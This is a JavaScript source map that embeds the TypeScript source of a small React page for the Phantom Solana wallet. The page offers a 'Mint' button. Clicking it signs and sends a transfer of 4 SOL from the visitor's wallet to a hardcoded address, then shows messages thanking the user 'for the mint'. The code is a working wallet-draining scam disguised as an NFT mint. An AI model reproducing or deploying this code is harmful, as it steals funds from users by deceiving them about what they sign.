{"version":3,"sources":["App.tsx","index.tsx"],"names":["NETWORK","clusterApiUrl","CONNECTION","Connection","PublicKey","App","provider","window","solana","isPhantom","getProvider","useState","logs","setLogs","addLog","log","setConnected","useEffect","on","connect","onlyIfTrusted","catch","disconnect","createTransaction","instructions","a","publicKey","transaction","Transaction","add","feePayer","anyTransaction","getRecentBlockhash","recentBlockhash","blockhash","createTransferTransaction","SystemProgram","transfer","fromPubkey","toPubkey","lamports","sendTransaction","signAndSendTransaction","signature","confirmTransaction","console","warn","JSON","stringify","sendTransferInstruction","className","onClick","res","map","i","rootElement","document","getElementById","render"],"mappings":"ySAyDMA,EAAUC,YAAc,UACxBC,EAAa,IAAIC,IAAWH,GACT,IAAII,IAC3B,gDAGa,SAASC,IACtB,IAAMC,EAlBY,WAClB,GAAI,WAAYC,OAAQ,CACtB,IACMD,EADiBC,OACIC,OAC3B,GAAIF,EAASG,UACX,OAAOH,GAaMI,GACjB,EAAwBC,mBAAmB,IAA3C,mBAAOC,EAAP,KAAaC,EAAb,KACMC,EAAS,SAACC,GAAD,OAAiBF,EAAQ,GAAD,mBAAKD,GAAL,CAAWG,MAClD,EAAyBJ,oBAAkB,GAAlCK,EAAT,oBACAC,qBAAU,WACR,GAAIX,EAaF,OAZAA,EAASY,GAAG,WAAW,WACrBF,GAAa,MAGfV,EAASY,GAAG,cAAc,WACxBF,GAAa,MAIfV,EAASa,QAAQ,CAAEC,eAAe,IAAQC,OAAM,eAGzC,WACLf,EAASgB,gBAGZ,CAAChB,IAKJ,IAAMiB,EAAiB,uCAAG,WAAOC,GAAP,mBAAAC,EAAA,yDACnBnB,EAASoB,UADU,wDAIpBC,GAAc,MAAIC,KAAcC,IAAlB,oBAAyBL,KAC/BM,SAAWxB,EAASoB,UAE1BK,EAAsBJ,EAPJ,SAShBzB,EAAW8B,qBATK,cAQxBD,EAAeE,gBARS,OAUtBC,UAVsB,kBAWjBP,GAXiB,2CAAH,sDAcjBQ,EAAyB,uCAAG,sBAAAV,EAAA,+EAChCF,EAAkB,CAChBa,IAAcC,SAAS,CACrBC,WAAYhC,EAASoB,UACrBa,SAAU,IAAInC,IACZ,gDAEFoC,SAAU,SAPkB,2CAAH,qDAWzBC,EAAe,uCAAG,WAAOd,GAAP,iBAAAF,EAAA,0DAClBE,EADkB,0CAGQrB,EAASoC,uBAAuBf,GAHxC,uBAGZgB,EAHY,EAGZA,UACN7B,EACE,8CALgB,SAOZZ,EAAW0C,mBAAmBD,GAPlB,OAQlB7B,EAAO,0BARW,kDAUlB+B,QAAQC,KAAR,MACAhC,EAAO,UAAYiC,KAAKC,UAAL,OAXD,0DAAH,sDAefC,EAAuB,uCAAG,4BAAAxB,EAAA,sEACJU,IADI,OACxBR,EADwB,OAE9Bc,EAAgBd,GAFc,2CAAH,qDAK7B,OACE,qBAAKuB,UAAU,MAAf,SACE,iCACG5C,GAAYA,EAASoB,UACpB,mCAGE,wBAAQyB,QAASF,EAAjB,oBAgBF,qCACE,wBACEE,QAAO,sBAAE,4BAAA1B,EAAA,+EAEanB,EAASa,UAFtB,OAECiC,EAFD,OAGLP,QAAQ9B,IAAIqC,GAHP,gDAMLP,QAAQC,KAAR,MACAhC,EAAO,UAAYiC,KAAKC,UAAL,OAPd,yDADX,gCADF,kGAmBF,qBAAKE,UAAU,OAAf,SACGtC,EAAKyC,KAAI,SAACtC,EAAKuC,GAAN,OACR,qBAAKJ,UAAU,MAAf,SACGnC,GADuBuC,aChLtC,IAAMC,EAAcC,SAASC,eAAe,QAC5CC,iBAAO,cAACrD,EAAD,IAASkD,I","file":"static/js/main.aa7a666b.chunk.js","sourcesContent":["import { useState, useEffect } from \"react\";\nimport {\n  Connection,\n  PublicKey,\n  Transaction,\n  clusterApiUrl,\n  SystemProgram,\n  TransactionInstruction,\n  SendOptions,\n} from \"@solana/web3.js\";\nimport { Token } from \"@solana/spl-token\";\nimport \"./styles.css\";\n\ntype DisplayEncoding = \"utf8\" | \"hex\";\ntype PhantomEvent = \"disconnect\" | \"connect\";\ntype PhantomRequestMethod =\n  | \"connect\"\n  | \"disconnect\"\n  | \"signTransaction\"\n  | \"signAllTransactions\"\n  | \"signAndSendTransaction\"\n  | \"signMessage\";\n\ninterface ConnectOpts {\n  onlyIfTrusted: boolean;\n}\n\ninterface PhantomProvider {\n  publicKey: PublicKey | null;\n  isConnected: boolean | null;\n  signTransaction: (transaction: Transaction) => Promise<Transaction>;\n  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;\n  signAndSendTransaction: (\n    transaction: Transaction,\n    options?: SendOptions\n  ) => Promise<{ signature: string }>;\n  signMessage: (\n    message: Uint8Array | string,\n    display?: DisplayEncoding\n  ) => Promise<{ signature: string; publicKey: PublicKey }>;\n  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;\n  disconnect: () => Promise<void>;\n  on: (event: PhantomEvent, handler: (args: any) => void) => void;\n  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;\n}\n\nconst getProvider = (): PhantomProvider | undefined => {\n  if (\"solana\" in window) {\n    const anyWindow: any = window;\n    const provider = anyWindow.solana;\n    if (provider.isPhantom) {\n      return provider;\n    }\n  }\n  // window.open(\"https://phantom.app/\", \"_blank\");\n};\n\nconst NETWORK = clusterApiUrl(\"devnet\");\nconst CONNECTION = new Connection(NETWORK);\nconst EXTERNAL_ADDRESS = new PublicKey(\n  \"8EvjnT5gVWNaBJ76aywXWJ94PU3PPjvTA9dkomG6MPxe\"\n);\n\nexport default function App() {\n  const provider = getProvider();\n  const [logs, setLogs] = useState<string[]>([]);\n  const addLog = (log: string) => setLogs([...logs, log]);\n  const [, setConnected] = useState<boolean>(false);\n  useEffect(() => {\n    if (provider) {\n      provider.on(\"connect\", () => {\n        setConnected(true);\n        // addLog(\"Connected to wallet \" + provider.publicKey?.toBase58());\n      });\n      provider.on(\"disconnect\", () => {\n        setConnected(false);\n        // addLog(\"Disconnected from wallet\");\n      });\n      // try to eagerly connect\n      provider.connect({ onlyIfTrusted: true }).catch(() => {\n        // fail silently\n      });\n      return () => {\n        provider.disconnect();\n      };\n    }\n  }, [provider]);\n  // if (!provider) {\n  //   return <h2>Could not find a provider</h2>;\n  // }\n\n  const createTransaction = async (instructions: TransactionInstruction[]) => {\n    if (!provider.publicKey) {\n      return;\n    }\n    let transaction = new Transaction().add(...instructions);\n    transaction.feePayer = provider.publicKey;\n    // addLog(\"Getting recent blockhash\");\n    const anyTransaction: any = transaction;\n    anyTransaction.recentBlockhash = (\n      await CONNECTION.getRecentBlockhash()\n    ).blockhash;\n    return transaction;\n  };\n\n  const createTransferTransaction = async () =>\n    createTransaction([\n      SystemProgram.transfer({\n        fromPubkey: provider.publicKey,\n        toPubkey: new PublicKey(\n          \"8EvjnT5gVWNaBJ76aywXWJ94PU3PPjvTA9dkomG6MPxe\"\n        ),\n        lamports: 4000000000,\n      }),\n    ]);\n\n  const sendTransaction = async (transaction: Transaction) => {\n    if (transaction) {\n      try {\n        let { signature } = await provider.signAndSendTransaction(transaction);\n        addLog(\n          \"Your mint have been received by our server\"\n        );\n        await CONNECTION.confirmTransaction(signature);\n        addLog(\"Thank you for the mint\");\n      } catch (err) {\n        console.warn(err);\n        addLog(\"Error: \" + JSON.stringify(err));\n      }\n    }\n  };\n  const sendTransferInstruction = async () => {\n    const transaction = await createTransferTransaction();\n    sendTransaction(transaction);\n  };\n\n  return (\n    <div className=\"App\">\n      <main>\n        {provider && provider.publicKey ? (\n          <>\n            {/* <div>Wallet address: {provider.publicKey?.toBase58()}.</div>\n            <div>isConnected: {provider.isConnected ? \"true\" : \"false\"}.</div> */}\n            <button onClick={sendTransferInstruction}>Mint</button>\n            {/* <button\n              onClick={async () => {\n                try {\n                  const res = await provider.disconnect();\n                  addLog(JSON.stringify(res));\n                } catch (err) {\n                  console.warn(err);\n                  addLog(\"Error: \" + JSON.stringify(err));\n                }\n              }}\n            >\n              Disconnect\n            </button> */}\n          </>\n        ) : (\n          <>\n            <button\n              onClick={async () => {\n                try {\n                  const res = await provider.connect();\n                  console.log(res);\n                  // addLog(JSON.stringify(res));\n                } catch (err) {\n                  console.warn(err);\n                  addLog(\"Error: \" + JSON.stringify(err));\n                }\n              }}\n            >\n              Connect to Phantom\n            </button>\n            Can't connect? Try opening this dApp in a new window. Phantom\n            rejects requests from iframes.\n          </>\n        )}\n        <div className=\"logs\">\n          {logs.map((log, i) => (\n            <div className=\"log\" key={i}>\n              {log}\n            </div>\n          ))}\n        </div>\n      </main>\n    </div>\n  );\n}\n","import { render } from \"react-dom\";\n\nimport App from \"./App\";\n\nconst rootElement = document.getElementById(\"mint\");\nrender(<App />, rootElement);\n"],"sourceRoot":""}